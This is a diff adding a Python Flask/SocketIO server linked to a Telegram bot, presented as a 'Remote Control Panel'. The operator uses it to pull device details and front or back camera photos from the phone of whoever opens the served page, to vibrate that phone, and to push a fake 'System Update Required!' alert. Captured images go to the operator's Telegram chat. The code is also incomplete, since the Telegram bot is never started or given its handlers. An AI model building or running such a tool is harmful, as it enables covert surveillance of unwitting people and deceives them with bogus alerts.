@@ -1,0 +1,118 @@
+import os
+import base64
+import threading
+import asyncio
+from flask import Flask, render_template, request
+from flask_socketio import SocketIO, emit
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler
+
+# --- Configuration ---
+TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
+# ---------------------
+
+app = Flask(__name__)
+socketio = SocketIO(app, cors_allowed_origins="*")
+
+# State management
+latest_telegram_context = {}
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+# --- SocketIO Handlers ---
+
+@socketio.on('device_info_report')
+def handle_device_info(data):
+    print(f"Device Info Received: {data}")
+    if 'update' in latest_telegram_context:
+        update = latest_telegram_context['update']
+        context = latest_telegram_context['context']
+        loop = latest_telegram_context['loop']
+        
+        info_text = (
+            "📱 *Device Information Received*\n\n"
+            f"🌐 *Browser:* {data.get('userAgent')[:100]}...\n"
+            f"🔋 *Battery:* {data.get('batteryLevel')} ({'Charging' if data.get('isCharging') else 'Not Charging'})\n"
+            f"🖥️ *Resolution:* {data.get('screenResolution')}\n"
+            f"📶 *Network:* {data.get('connectionType')}\n"
+            f"🌍 *Language:* {data.get('language')}"
+        )
+        
+        asyncio.run_coroutine_threadsafe(
+            context.bot.send_message(chat_id=update.effective_chat.id, text=info_text, parse_mode='Markdown'),
+            loop
+        )
+
+@socketio.on('photo_captured')
+def handle_photo(data):
+    image_data = data['image']
+    header, encoded = image_data.split(",", 1)
+    binary_data = base64.b64decode(encoded)
+    
+    with open("captured.jpg", "wb") as f:
+        f.write(binary_data)
+    
+    if 'update' in latest_telegram_context:
+        update = latest_telegram_context['update']
+        context = latest_telegram_context['context']
+        loop = latest_telegram_context['loop']
+        
+        asyncio.run_coroutine_threadsafe(
+            context.bot.send_photo(chat_id=update.effective_chat.id, photo=open("captured.jpg", "rb"), caption="📸 Captured Image"),
+            loop
+        )
+
+@socketio.on('error_log')
+def handle_error(data):
+    if 'update' in latest_telegram_context:
+        update = latest_telegram_context['update']
+        context = latest_telegram_context['context']
+        loop = latest_telegram_context['loop']
+        asyncio.run_coroutine_threadsafe(
+            context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Error: {data['message']}"),
+            loop
+        )
+
+# --- Telegram Bot Logic ---
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Save context
+    latest_telegram_context['update'] = update
+    latest_telegram_context['context'] = context
+    latest_telegram_context['loop'] = asyncio.get_event_loop()
+
+    keyboard = [
+        [InlineKeyboardButton("Capture Front 📸", callback_data='user'), InlineKeyboardButton("Capture Back 📸", callback_data='environment')],
+        [InlineKeyboardButton("Vibrate Phone 📳", callback_data='vibrate')],
+        [InlineKeyboardButton("Show Alert ⚠️", callback_data='alert')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text('🎮 *Remote Control Panel*', reply_markup=reply_markup, parse_mode='Markdown')
+
+async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    # Update context
+    latest_telegram_context['update'] = update
+    latest_telegram_context['context'] = context
+    latest_telegram_context['loop'] = asyncio.get_event_loop()
+
+    action = query.data
+    
+    if action in ['user', 'environment']:
+        await query.edit_message_text(text=f"⏳ Requesting {action} camera photo...")
+        socketio.emit('request_capture', {'camera': action})
+    elif action == 'vibrate':
+        await query.edit_message_text(text="📳 Sending vibration command...")
+        socketio.emit('request_vibrate', {'pattern': 1000})
+    elif action == 'alert':
+        socketio.emit('request_alert', {'message': "System Update Required!"})
+        await query.edit_message_text(text="⚠️ Alert message sent to device.")
+
+if __name__ == '__main__':
+    # Note: For production, use a more robust threading/async approach
+    print("Starting Web Server on http://0.0.0.0:5000")
+    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
